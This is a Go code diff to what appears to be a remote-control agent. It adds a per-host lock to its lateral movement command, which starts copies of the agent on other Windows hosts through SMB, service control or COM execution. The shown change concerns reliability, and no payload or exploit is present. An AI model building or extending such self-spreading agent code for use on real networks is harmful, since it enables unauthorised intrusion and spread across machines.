@@ -95,6 +95,38 @@ func awaitLateralResult(ctx context.Context, results <-chan lateralResult, progr
 	}
 }
 
+// errLateralHostBusy explains why a retry was refused while an earlier
+// worker may still be running on the same target host.
+var errLateralHostBusy = errors.New("a lateral deployment to this host is already in progress in this agent; wait for it to finish before retrying")
+
+// lateralInFlight tracks deployments whose worker may still run after the
+// command deadline. The Go deadline ends waiting, not native SMB/SCM/COM
+// execution, so without this guard an immediate retry would stack a second
+// deployment on the same host while the first is still progressing.
+var lateralInFlight = struct {
+	sync.Mutex
+	hosts map[string]bool
+}{hosts: make(map[string]bool)}
+
+// claimLateralHost reserves the target host for one deployment at a time.
+func claimLateralHost(host string) error {
+	lateralInFlight.Lock()
+	defer lateralInFlight.Unlock()
+	if lateralInFlight.hosts[host] {
+		return fmt.Errorf("%w: %s", errLateralHostBusy, host)
+	}
+	lateralInFlight.hosts[host] = true
+	return nil
+}
+
+// releaseLateralHost frees the host reservation once its worker has fully
+// completed; an unclaimed host is a no-op so test seams cannot strand locks.
+func releaseLateralHost(host string) {
+	lateralInFlight.Lock()
+	delete(lateralInFlight.hosts, host)
+	lateralInFlight.Unlock()
+}
+
 func parseLateralPayload(command string) (lateralPayload, error) {
 	var payload lateralPayload
 	parts := strings.SplitN(command, "\n", 2)
@@ -180,7 +212,9 @@ func parseLateralPayload(command string) (lateralPayload, error) {
 // lateralCommand handles __LATERAL__: start a copy of this agent on another
 // host through the requested execution method.
 //
-// All methods use a pinned worker. Deadlines bound waiting, not native calls.
+// All methods use a pinned worker. Deadlines bound waiting, not native calls;
+// the per-host claim is released only by the worker's own completion, so a
+// caller-side timeout cannot free the reservation while work continues.
 func lateralCommand(command string) (string, error) {
 	payload, err := parseLateralPayload(command)
 	if err != nil {
@@ -188,6 +222,9 @@ func lateralCommand(command string) (string, error) {
 	}
 	if runtime.GOOS != "windows" {
 		return "", errors.New("lateral movement requires the Windows agent build")
+	}
+	if err := claimLateralHost(payload.Host); err != nil {
+		return "", err
 	}
 	ctx, cancel := context.WithTimeout(agentContext, time.Duration(payload.TimeoutSeconds*float64(time.Second)))
 	defer cancel()
